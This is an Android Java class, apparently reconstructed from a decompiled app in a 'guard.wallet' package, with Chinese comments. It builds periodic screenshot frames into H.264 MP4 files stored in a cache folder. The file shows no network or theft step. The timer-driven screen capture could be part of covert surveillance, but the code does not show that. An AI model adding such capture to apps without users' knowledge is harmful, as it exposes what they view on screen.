package com.guard.wallet.media;

/**
 * 视频录制管理器 — 管理视频录制：创建缓存目录、配置 MediaFormat (H.264)、
 * 将 Bitmap 帧捕获到队列中、在线程池上编码为 MP4。
 *
 * vendor 原始路径: d0/a.java
 */

import com.guard.wallet.core.AppUtils;
import com.guard.wallet.util.SyntheticHelper;
import android.graphics.Bitmap;
import android.media.MediaFormat;
import android.os.Build;
import android.util.Log;
import com.guard.wallet.thread.PeriodicTaskDispatcher;
import com.guard.wallet.thread.BitmapToMp4Task;
import com.guard.wallet.utils.SystemHelper;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.LinkedList;
import java.util.Locale;
import java.util.Objects;
import java.util.Timer;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

public final class VideoRecordManager {

    private static final String TAG = "VideoRecordManager";

    /** vendor i — 固定大小线程池 (5 线程), 用于提交视频编码任务 */
    public static final ExecutorService executorService = Executors.newFixedThreadPool(5);

    /** vendor j — 待完成的 Future 列表, 追踪所有已提交的编码任务 */
    public static final LinkedList<Future> pendingFutures = new LinkedList<>();

    /** vendor a — 待编码的 Bitmap 帧队列 */
    public final ConcurrentLinkedQueue<Bitmap> frameQueue = new ConcurrentLinkedQueue<>();

    /** vendor b — 是否正在录制 */
    public final AtomicBoolean isRecording = new AtomicBoolean(false);

    /** vendor c — 上次编码时间戳 */
    public final AtomicLong lastEncodeTimestamp = new AtomicLong(0L);

    /** vendor d — 定时器, 用于周期性触发编码 */
    public final Timer timer = new Timer();

    /** vendor e — TimerTask 分发器 (case 2: 截屏回调) */
    public final PeriodicTaskDispatcher timerTask;

    /** vendor f — 画质控制器 (API 30+ 截屏压缩参数) */
    public final com.guard.wallet.capture.ScreenshotCallback qualityController;

    /** vendor g — 视频缓存目录路径 */
    public final String videoCacheDir;

    /** vendor h — 视频 MediaFormat 配置 (H.264 / AVC) */
    public final MediaFormat videoFormat;

    public VideoRecordManager(int width, int height) {
        // ---- 初始化视频缓存目录 ----
        StringBuilder sb = new StringBuilder();
        sb.append(SystemHelper.i0());
        String cachePath = SyntheticHelper.appendStrStr(sb, File.separator, "CacheVideos");
        File cacheDir = new File(cachePath);
        boolean exists = cacheDir.exists();

        String logMsg;
        if (exists) {
            // 目录已存在 — 清空旧视频文件
            if (cacheDir.listFiles() != null) {
                File[] files = cacheDir.listFiles();
                Objects.requireNonNull(files);
                for (File file : files) {
                    boolean deleted = file.delete();
                    Log.d(TAG, String.format(Locale.CHINA, "删除Video文件:%s %b", file.getName(), deleted));
                }
            }
            logMsg = String.format(Locale.CHINA, "Video目录:%s", cachePath);
        } else {
            // 目录不存在 — 创建
            exists = cacheDir.mkdirs();
            logMsg = String.format(Locale.CHINA, "创建Video目录:%s -> %b", cachePath, exists);
        }

        Log.d(TAG, logMsg);
        this.videoCacheDir = exists ? cachePath : null;

        try {
            MediaFormat format = MediaFormat.createVideoFormat("video/avc", width, height);
            this.videoFormat = format;
            format.setInteger("color-format", 2130708361);
            format.setInteger("bitrate", width * height * 10);
            format.setInteger("frame-rate", 25);
            format.setInteger("i-frame-interval", 1);

            if (Build.VERSION.SDK_INT >= 30) {
                this.qualityController = new com.guard.wallet.capture.ScreenshotCallback(0.5F, 20);
            } else {
                this.qualityController = null;
            }

            this.timerTask = new PeriodicTaskDispatcher(this, 2);
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            // ADAPT: 在异常路径中保证 final 字段被赋值
            throw new RuntimeException("VideoRecordManager init failed", ex);
        }
    }

    /**
     * vendor a() — 将帧队列中的所有 Bitmap 编码为一个 MP4 片段。
     * 生成带时间戳的文件名, 提交给线程池编码, 然后清空帧队列。
     */
    public final void encodeFrames() {
        ConcurrentLinkedQueue<Bitmap> queue = this.frameQueue;
        if (queue.isEmpty()) {
            return;
        }

        String outputPath;
        String dir = this.videoCacheDir;
        if (AppUtils.B(dir)) {
            outputPath = null;
        } else {
            SimpleDateFormat sdf = new SimpleDateFormat("yyMMdd_HHmmss", Locale.CHINA);
            StringBuilder pathBuilder = SyntheticHelper.toBuilder(dir);
            pathBuilder.append(File.separator);
            pathBuilder.append("v-");
            pathBuilder.append(sdf.format(new Date()));
            pathBuilder.append(".mp4");
            outputPath = pathBuilder.toString();

            Log.d(TAG, "tmp video file " + outputPath);

            File file = new File(outputPath);
            if (file.exists()) {
                boolean deleted = file.delete();
                Log.d(TAG, String.format(Locale.CHINA, "删除Video文件:%s -> %b", outputPath, deleted));
            }
        }

        BitmapToMp4Task encoder = new BitmapToMp4Task(queue.toArray(new Bitmap[0]), outputPath, this.videoFormat);
        Future<?> future = executorService.submit(encoder);
        pendingFutures.add(future);
        this.lastEncodeTimestamp.set(System.currentTimeMillis());
        queue.clear();
    }
}
